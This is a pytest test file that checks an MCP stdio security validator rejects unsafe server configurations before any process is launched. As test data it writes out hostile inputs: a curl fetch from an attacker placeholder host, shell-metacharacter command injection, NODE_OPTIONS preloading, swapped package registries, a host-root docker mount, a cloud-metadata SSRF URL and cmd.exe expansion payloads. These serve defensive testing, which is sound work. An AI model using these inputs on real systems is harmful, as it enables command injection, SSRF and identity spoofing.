"""Execution-boundary validation for resolved MCP server configurations."""

import shlex
from types import SimpleNamespace
from unittest.mock import AsyncMock, MagicMock

import pytest
from lfx.base.mcp import util as mcp_util
from lfx.base.mcp.security import MAX_SHELL_WRAPPER_DEPTH, MCPStdioSecurityError, validate_mcp_stdio_config
from lfx.base.mcp.util import MCPStdioClient, update_tools
from lfx.components.deactivated.mcp_stdio import MCPStdio


@pytest.mark.parametrize(
    ("server_config", "error_match"),
    [
        (
            {"mode": "Stdio", "command": "curl", "args": ["https://attacker.invalid/payload"]},
            "Command 'curl' is not allowed",
        ),
        (
            {"mode": "Stdio", "command": "node", "args": ["server.js; touch /tmp/pwned"]},
            "dangerous shell metacharacter",
        ),
        (
            {
                "mode": "Stdio",
                "command": "node",
                "args": ["server.js"],
                "env": {"NODE_OPTIONS": "--require=/tmp/pwn.js"},
            },
            "Environment variable 'NODE_OPTIONS' is not allowed",
        ),
        (
            {
                "mode": "Stdio",
                "command": "uvx",
                "args": ["mcp-server"],
                "env": {"UV_DEFAULT_INDEX": "https://packages.example.invalid/simple"},
            },
            "Environment variable 'UV_DEFAULT_INDEX' is not allowed",
        ),
        (
            {
                "mode": "Stdio",
                "command": "python",
                "args": ["-m", "langflow.agentic.mcp"],
                "env": {"LANGFLOW_AGENTIC_USER_ID": "victim"},
            },
            "Environment variable 'LANGFLOW_AGENTIC_USER_ID' is not allowed",
        ),
        (
            {
                "mode": "Stdio",
                "command": "npx",
                "args": ["--registry=https://packages.example.invalid", "@example/mcp-server"],
            },
            "not allowed",
        ),
        (
            {"mode": "Stdio", "command": "bash", "args": ["-lc", "python -c pass"]},
            "not allowed",
        ),
        (
            {"mode": "Stdio", "command": "sh", "args": ["-cnode -e pass"]},
            "dangerous keyword '-e'",
        ),
        (
            {"mode": "Stdio", "command": "cmd", "args": ["/c", "node -e pass"]},
            "dangerous keyword '-e'",
        ),
        (
            {
                "mode": "Stdio",
                "command": "bash",
                "args": ["-c", "npx --registry=https://packages.example.invalid @example/mcp-server"],
            },
            "not allowed",
        ),
        (
            {
                "mode": "Stdio",
                "command": "docker",
                "args": ["run", "--mount", "type=bind,source=/,target=/host", "mcp-image"],
            },
            "not allowed",
        ),
    ],
)
async def test_update_tools_rejects_unsafe_stdio_config_before_connecting(server_config, error_match):
    """Flow/tweak configs must receive the same policy as stored configs before use."""
    stdio_client = AsyncMock()

    with pytest.raises(ValueError, match=error_match):
        await update_tools("embedded-server", server_config, mcp_stdio_client=stdio_client)

    stdio_client.connect_to_server.assert_not_awaited()


async def test_update_tools_allows_safe_stdio_config():
    """The runtime gate must preserve legitimate stdio configs."""
    stdio_client = AsyncMock()
    stdio_client.connect_to_server.return_value = []

    await update_tools(
        "safe-stdio",
        {
            "mode": "Stdio",
            "command": "uvx",
            "args": ["mcp-server-fetch"],
            "env": {"API_KEY": "test-value"},  # pragma: allowlist secret
        },
        mcp_stdio_client=stdio_client,
    )

    stdio_client.connect_to_server.assert_awaited_once_with(
        "uvx mcp-server-fetch",
        {"API_KEY": "test-value"},  # pragma: allowlist secret
    )


async def test_update_tools_requires_user_for_agentic_server():
    """The internal agentic MCP server must fail closed without an authenticated user id."""
    stdio_client = AsyncMock()
    config = {"mode": "Stdio", "command": "python", "args": ["-m", "langflow.agentic.mcp"]}

    with pytest.raises(ValueError, match="authenticated user"):
        await update_tools("langflow-agentic", config, mcp_stdio_client=stdio_client)

    stdio_client.connect_to_server.assert_not_awaited()


async def test_update_tools_injects_bound_user_for_agentic_server():
    """The authenticated caller, rather than the tenant config, supplies the agentic identity."""
    stdio_client = AsyncMock()
    stdio_client.connect_to_server.return_value = []
    config = {"mode": "Stdio", "command": "python", "args": ["-m", "langflow.agentic.mcp"]}
    user_id = "11111111-1111-1111-1111-111111111111"

    await update_tools(
        "langflow-agentic",
        config,
        mcp_stdio_client=stdio_client,
        current_user_id=user_id,
    )

    stdio_client.connect_to_server.assert_awaited_once_with(
        "python -m langflow.agentic.mcp",
        {},
        current_user_id=user_id,
    )


async def test_update_tools_preserves_executable_path_with_spaces():
    """An executable path remains one argv entry when the command is serialized."""
    stdio_client = AsyncMock()
    stdio_client.connect_to_server.return_value = []
    command = "/opt/Node Tools/node"

    await update_tools(
        "safe-path",
        {"mode": "Stdio", "command": command, "args": ["server.js"]},
        mcp_stdio_client=stdio_client,
    )

    stdio_client.connect_to_server.assert_awaited_once_with(
        shlex.join([command, "server.js"]),
        {},
    )


async def test_update_tools_does_not_apply_stdio_policy_to_streamable_http(monkeypatch):
    """A safe Streamable HTTP config must remain on the HTTP transport path."""
    stdio_client = AsyncMock()
    http_client = AsyncMock()
    http_client.connect_to_server.return_value = []
    monkeypatch.setattr(mcp_util, "validate_connector_url_for_ssrf", lambda _url: None)

    await update_tools(
        "safe-http",
        {"mode": "Streamable_HTTP", "url": "https://mcp.example.com/mcp"},
        mcp_stdio_client=stdio_client,
        mcp_streamable_http_client=http_client,
    )

    stdio_client.connect_to_server.assert_not_awaited()
    http_client.connect_to_server.assert_awaited_once_with(
        "https://mcp.example.com/mcp",
        headers={},
        verify_ssl=True,
        # Unpinned configs keep the historical SSE fallback; a pinned preset sets this False.
        allow_sse_fallback=True,
    )


async def test_update_tools_validates_streamable_http_url_before_connecting(monkeypatch):
    """Flow-embedded HTTP configs must pass connector SSRF policy before network access."""
    metadata_url = "http://169.254.169.254/latest/meta-data/"
    http_client = AsyncMock()

    def reject_metadata_url(url):
        assert url == metadata_url
        msg = "blocked by connector SSRF policy"
        raise ValueError(msg)

    monkeypatch.setattr(mcp_util, "validate_connector_url_for_ssrf", reject_metadata_url)

    with pytest.raises(ValueError, match="blocked by connector SSRF policy"):
        await update_tools(
            "unsafe-http",
            {"mode": "Streamable_HTTP", "url": metadata_url},
            mcp_streamable_http_client=http_client,
        )

    http_client.connect_to_server.assert_not_awaited()


@pytest.mark.parametrize(
    ("command", "env", "error_match"),
    [
        ("curl https://attacker.invalid/payload", None, "Command 'curl' is not allowed"),
        ("node 'server.js; touch /tmp/pwned'", None, "dangerous shell metacharacter"),
        ("node server.js", {"NODE_OPTIONS": "--require=/tmp/pwn.js"}, "NODE_OPTIONS"),
        (
            "uvx mcp-server",
            {"PIP_INDEX_URL": "https://packages.example.invalid/simple"},
            "PIP_INDEX_URL",
        ),
        (
            "npx --registry=https://packages.example.invalid @example/mcp-server",
            None,
            "not allowed",
        ),
        (
            "docker run --mount type=bind,source=/,target=/host mcp-image",
            None,
            "not allowed",
        ),
    ],
)
async def test_stdio_client_revalidates_config_immediately_before_spawn(command, env, error_match):
    """The final client boundary must enforce every shared policy before session creation."""
    client = MCPStdioClient()
    get_session = AsyncMock()
    client._get_or_create_session = get_session  # type: ignore[method-assign]

    with pytest.raises(ValueError, match=error_match):
        await client._connect_to_server(command, env)

    get_session.assert_not_awaited()
    assert client._connection_params is None


async def test_stdio_client_preserves_safe_package_and_provider_credentials():
    """Trusted registry packages and provider credentials remain valid at pre-spawn."""
    client = MCPStdioClient()
    session = MagicMock()
    session.list_tools = AsyncMock(return_value=MagicMock(tools=[]))
    client._get_or_create_session = AsyncMock(return_value=session)  # type: ignore[method-assign]

    await client._connect_to_server(
        "uvx --from lfx lfx-mcp",
        {"GITHUB_PERSONAL_ACCESS_TOKEN": "provider-token"},  # pragma: allowlist secret
    )

    assert client._connection_params.command == "uvx"
    assert client._connection_params.args == ["--from", "lfx", "lfx-mcp"]
    assert client._connection_params.env["GITHUB_PERSONAL_ACCESS_TOKEN"] == "provider-token"  # noqa: S105


async def test_stdio_client_injects_trusted_agentic_user_only_at_spawn_boundary():
    """Trusted identity is injected after tenant env validation and before process creation."""
    from lfx.base.mcp.security import AGENTIC_USER_ID_ENV_VAR

    client = MCPStdioClient()
    session = MagicMock()
    session.list_tools = AsyncMock(return_value=MagicMock(tools=[]))
    client._get_or_create_session = AsyncMock(return_value=session)  # type: ignore[method-assign]
    user_id = "11111111-1111-1111-1111-111111111111"

    await client._connect_to_server(
        "python -m langflow.agentic.mcp",
        {"API_KEY": "test-value"},  # pragma: allowlist secret
        current_user_id=user_id,
    )

    assert client._connection_params.env[AGENTIC_USER_ID_ENV_VAR] == user_id


async def test_stdio_client_rejects_tenant_spoofed_agentic_user_before_spawn():
    """Tenant-controlled config cannot override the trusted agentic identity."""
    from lfx.base.mcp.security import AGENTIC_USER_ID_ENV_VAR

    client = MCPStdioClient()
    get_session = AsyncMock()
    client._get_or_create_session = get_session  # type: ignore[method-assign]

    with pytest.raises(ValueError, match=AGENTIC_USER_ID_ENV_VAR):
        await client._connect_to_server(
            "python -m langflow.agentic.mcp",
            {AGENTIC_USER_ID_ENV_VAR: "victim"},
            current_user_id="11111111-1111-1111-1111-111111111111",
        )

    get_session.assert_not_awaited()
    assert client._connection_params is None


async def test_stdio_client_preserves_executable_path_with_spaces():
    """The immediate pre-spawn gate accepts one quoted executable path and structured args."""
    client = MCPStdioClient()
    session = MagicMock()
    session.list_tools = AsyncMock(return_value=MagicMock(tools=[]))
    client._get_or_create_session = AsyncMock(return_value=session)  # type: ignore[method-assign]
    command = "/opt/Node Tools/node"

    await client._connect_to_server(shlex.join([command, "server.js"]), None)

    assert client._connection_params.command == command
    assert client._connection_params.args == ["server.js"]


@pytest.mark.parametrize("resolved_command", [None, r"C:\Program Files\uv\uvx.exe"])
async def test_stdio_client_preserves_sanitized_opaque_header_values(monkeypatch, resolved_command):
    """HTTP punctuation in proxy header data must not be interpreted as command syntax."""
    if resolved_command:
        monkeypatch.setattr(mcp_util, "sys", SimpleNamespace(platform="win32"))
        monkeypatch.setattr("mcp.os.win32.utilities.shutil.which", lambda _command: resolved_command)
    client = MCPStdioClient()
    session = MagicMock()
    session.list_tools = AsyncMock(return_value=MagicMock(tools=[]))
    client._get_or_create_session = AsyncMock(return_value=session)  # type: ignore[method-assign]

    await client._connect_to_server(
        "uvx mcp-proxy --transport streamablehttp https://mcp.example.com",
        headers={"Cookie": "session=abc; theme=dark"},
    )

    assert client._connection_params.args == [
        "mcp-proxy",
        "--transport",
        "streamablehttp",
        "--headers",
        "cookie",
        "session=abc; theme=dark",
        "https://mcp.example.com",
    ]


@pytest.mark.parametrize(
    ("launcher", "resolved_command"),
    [
        ("cmd /c uvx", None),
        ("cmd /k uvx", None),
        ("cmd /r uvx", None),
        ("cmd /d /c uvx", None),
        ("cmd /q/k uvx", None),
        ("npx", r"C:\Program Files\nodejs\npx.cmd"),
        ("npx", r"C:\Program Files\nodejs\npx.bat"),
        ("npx", r"C:\Program Files\nodejs\npx.CMD"),
    ],
)
@pytest.mark.parametrize(
    "headers",
    [
        {"Authorization": "token&echo"},
        {"Authorization": "token|echo"},
        {"Authorization": "token>output"},
        {"Authorization": "%MCP_TOKEN%"},
        {"Authorization": "!MCP_TOKEN!"},
        {"Authorization": "token^value"},
        {"Authorization": 'token"value'},
        {"Authorization": "token(value"},
        {"Authorization": "token)value"},
        {"X-Header&Echo": "value"},
    ],
)
async def test_stdio_client_rejects_shell_syntax_in_injected_headers(monkeypatch, launcher, resolved_command, headers):
    """HTTP-valid headers must not bypass the policy for a cmd.exe payload."""
    if resolved_command:
        monkeypatch.setattr(mcp_util, "sys", SimpleNamespace(platform="win32"))
        monkeypatch.setattr("mcp.os.win32.utilities.shutil.which", lambda _command: resolved_command)
    client = MCPStdioClient()
    get_session = AsyncMock()
    client._get_or_create_session = get_session  # type: ignore[method-assign]

    with pytest.raises(MCPStdioSecurityError, match="arguments are unsafe for a shell wrapper") as exc_info:
        await client._connect_to_server(
            f"{launcher} mcp-proxy https://mcp.example.com",
            headers=headers,
        )

    assert not any(value in str(exc_info.value) for value in headers.values())
    get_session.assert_not_awaited()
    assert client._connection_params is None


@pytest.mark.parametrize("header_value", ["Bearer token-._~+/=", "Bearer install", "Bearer pip", "Bearer -e"])
@pytest.mark.parametrize("header_name", ["Authorization", "Install"])
async def test_stdio_client_preserves_safe_headers_with_cmd_wrapper(header_name, header_value):
    """A validated shell wrapper can still pass ordinary proxy credentials."""
    client = MCPStdioClient()
    session = MagicMock()
    session.list_tools = AsyncMock(return_value=MagicMock(tools=[]))
    client._get_or_create_session = AsyncMock(return_value=session)  # type: ignore[method-assign]

    await client._connect_to_server(
        "cmd /d /c uvx mcp-proxy https://mcp.example.com",
        headers={header_name: header_value},
    )

    assert client._connection_params.command == "cmd"
    assert client._connection_params.args == [
        "/d",
        "/c",
        "uvx",
        "mcp-proxy",
        "--headers",
        header_name.lower(),
        header_value,
        "https://mcp.example.com",
    ]


@pytest.mark.parametrize("extension", [".cmd", ".bat", ".CMD"])
@pytest.mark.parametrize("headers", [None, {"Authorization": "Bearer token-._~+/="}])
@pytest.mark.parametrize("npx_flag", ["", "-y", "--yes"])
async def test_stdio_client_preserves_safe_resolved_batch_script(monkeypatch, extension, headers, npx_flag):
    """Validate and pin the same batch script selected by the SDK resolver."""
    resolved_command = rf"C:\Program Files\nodejs\npx{extension}"
    monkeypatch.setattr(mcp_util, "sys", SimpleNamespace(platform="win32"))
    monkeypatch.setattr(
        "mcp.os.win32.utilities.shutil.which",
        lambda command: resolved_command if command == f"npx{extension.lower()}" else None,
    )
    client = MCPStdioClient()
    session = MagicMock()
    session.list_tools = AsyncMock(return_value=MagicMock(tools=[]))
    client._get_or_create_session = AsyncMock(return_value=session)  # type: ignore[method-assign]

    await client._connect_to_server(
        f"npx {npx_flag} mcp-proxy https://mcp.example.com",
        headers=headers,
    )

    assert client._connection_params.command == resolved_command
    header_args = ["--headers", "authorization", "Bearer token-._~+/="] if headers else []
    flag_args = [npx_flag] if npx_flag else []
    assert client._connection_params.args == [*flag_args, "mcp-proxy", *header_args, "https://mcp.example.com"]


@pytest.mark.parametrize("argument", ["%MCP_VALUE%", "!MCP_VALUE!", "token^value", 'token"value'])
async def test_stdio_client_rejects_cmd_expansion_in_original_batch_arguments(monkeypatch, argument):
    """Original arguments also need the syntax policy for the resolved batch script."""
    monkeypatch.setattr(mcp_util, "sys", SimpleNamespace(platform="win32"))
    monkeypatch.setattr("mcp.os.win32.utilities.shutil.which", lambda _command: r"C:\nodejs\npx.cmd")
    client = MCPStdioClient()
    get_session = AsyncMock()
    client._get_or_create_session = get_session  # type: ignore[method-assign]

    with pytest.raises(MCPStdioSecurityError, match="arguments are unsafe for a shell wrapper"):
        await client._connect_to_server(shlex.join(["npx", "-y", "mcp-proxy", argument]))

    get_session.assert_not_awaited()
    assert client._connection_params is None


def test_shell_wrapper_nesting_is_bounded():
    payload = "node server.js"
    for _ in range(MAX_SHELL_WRAPPER_DEPTH):
        payload = f"sh -c {shlex.quote(payload)}"

    with pytest.raises(MCPStdioSecurityError, match=r"nesting exceeds|cannot execute 'sh'"):
        validate_mcp_stdio_config("sh", ["-c", payload], None)


@pytest.mark.parametrize(
    "command",
    [
        "curl https://attacker.invalid/payload",
        "bash -lc 'python -c pass'",
        "sh '-cnode -e pass'",
        "cmd /c node -e pass",
    ],
)
async def test_legacy_stdio_component_validates_saved_command_before_connecting(command):
    """The legacy direct-client path must not bypass the shared command policy."""
    component = MCPStdio()
    component.command = command
    component.client = AsyncMock()
    component.client.session = None

    with pytest.raises(ValueError, match=r"not allowed|only allowed"):
        await component.build_output()

    component.client.connect_to_server.assert_not_awaited()


async def test_legacy_stdio_component_normalizes_safe_default_before_connecting():
    """The deprecated packed-string default remains usable through the shared policy."""
    component = MCPStdio()
    component.command = "uvx mcp-sse-shim"
    component.client = AsyncMock()
    component.client.session = None
    component.client.connect_to_server.return_value = []

    assert await component.build_output() == []

    component.client.connect_to_server.assert_awaited_once_with("uvx mcp-sse-shim")


async def test_legacy_stdio_component_preserves_packed_absolute_path_command():
    """The deprecated one-field input keeps parsing executable paths plus arguments."""
    component = MCPStdio()
    component.command = "/usr/bin/node server.js"
    component.client = AsyncMock()
    component.client.session = None
    component.client.connect_to_server.return_value = []

    assert await component.build_output() == []

    component.client.connect_to_server.assert_awaited_once_with("/usr/bin/node server.js")
